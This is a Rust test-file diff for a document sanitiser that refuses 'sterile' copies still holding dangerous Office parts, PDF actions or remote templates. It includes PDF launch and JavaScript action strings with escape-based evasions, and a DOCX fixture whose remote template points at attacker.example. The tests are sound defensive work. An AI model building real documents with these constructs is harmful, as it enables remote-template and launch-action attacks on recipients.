@@ -13,7 +13,7 @@ use arca_preview::model::{
 use arca_xray::sanitize::SanitizedDocument;
 use arca_xray::{
     BehaviorKind, Finding, MacroBehavior, MacroIntent, MacroLanguage, MacroModule, Severity,
-    ThreatKind,
+    ThreatKind, Verdict,
 };
 use zeroize::Zeroizing;
 
@@ -251,6 +251,15 @@ fn a_sterile_copy_that_still_holds_what_sterilisation_removes_is_refused() {
         "word/embeddings/oleObject1.bin",
         "word/embeddings/Microsoft_Excel_Sheet1.xlsx",
         "xl/macrosheets/sheet1.xml",
+        "xl/dialogsheets/sheet1.xml",
+        "customUI/customUI14.xml",
+        "xl/externalLinks/externalLink1.xml",
+        "xl/connections.xml",
+        "word/webextensions/webextension1.xml",
+        "Basic/Standard/Module1.xml",
+        "Scripts/python/run.py",
+        "Dialogs/Standard/Dialog1.xml",
+        "Configurations2/toolbar/custom.xml",
     ] {
         let doc = sterile(zip_with(&["[Content_Types].xml", part]));
         assert!(check_sterile(&doc).unwrap_err().contains("part"), "{part}");
@@ -498,4 +507,54 @@ fn what_a_macro_does_reaches_the_app_as_names_and_visible_lines() {
         assert!(!behaviors.contains(raw), "{raw:?} reached the app: {behaviors}");
     }
     assert!(crate::json::check::parse(json.as_bytes()).is_ok());
+}
+
+#[test]
+fn a_sterile_pdf_that_still_names_an_action_or_a_script_is_refused() {
+    for name in [
+        "/OpenAction 3 0 R",
+        "/AA << /O 4 0 R >>",
+        "/S /JavaScript /JS (app.alert(1))",
+        "/S /Launch /F (cmd.exe)",
+        "/EmbeddedFiles 5 0 R",
+        "/RichMedia 6 0 R",
+        "/XFA 7 0 R",
+        // Escapes in names do not hide them.
+        "/Open#41ction 3 0 R",
+        "/J#61vaScript (x)",
+    ] {
+        let pdf = format!("%PDF-1.7\n1 0 obj << /Type /Catalog {name} >> endobj\n%%EOF\n");
+        let doc = sterile(pdf.into_bytes());
+        assert!(check_sterile(&doc).unwrap_err().contains("PDF"), "{name}");
+    }
+    // Names that merely start like a forbidden one are not it.
+    let fine = "%PDF-1.7\n1 0 obj << /Type /Catalog /JSON 1 /AAA 2 /Launcher 3 >> endobj\n%%EOF\n";
+    assert_eq!(check_sterile(&sterile(fine.as_bytes().to_vec())), Ok(()));
+}
+
+/// The guest's sterile copy is X-rayed again by the host in a fresh sandbox: a copy the
+/// (possibly compromised) guest calls clean but that still has an external template, an
+/// event-bound macro or an open action is not handed out. Needs the built guest.
+#[test]
+fn a_tampered_sterile_copy_is_refused_by_the_second_scan() {
+    let Some(path) =
+        std::env::var_os("ARCA_GUEST_WASM").or_else(|| std::env::var_os("ARCA_GUEST_XRAY_WASM"))
+    else {
+        return;
+    };
+    let host = Host::new(Engine::new(std::fs::read(path).unwrap(), EngineConfig::default()));
+    let token = arca_sandbox::CancelToken::new();
+    // A DOCX whose only remaining danger is a remote template (no forbidden part name).
+    let mut w = ZipWriter::new();
+    w.add("[Content_Types].xml", br#"<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>"#, Compression::Deflated).unwrap();
+    w.add("_rels/.rels", br#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>"#, Compression::Deflated).unwrap();
+    w.add("word/document.xml", br#"<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>hi</w:t></w:r></w:p></w:body></w:document>"#, Compression::Deflated).unwrap();
+    w.add("word/_rels/document.xml.rels", br#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://attacker.example/t.dotm" TargetMode="External"/></Relationships>"#, Compression::Deflated).unwrap();
+    let docx = w.finish().unwrap();
+    let mut doc = sterile(docx);
+    // The (lying) guest says it is clean; the cheap checks pass.
+    doc.verification.verdict = Verdict::Clean;
+    assert_eq!(check_sterile(&doc), Ok(()));
+    let why = host.rescan_sterile(&doc, &token).unwrap_err();
+    assert!(why.contains("still has") || why.contains("checked again"), "{why}");
 }
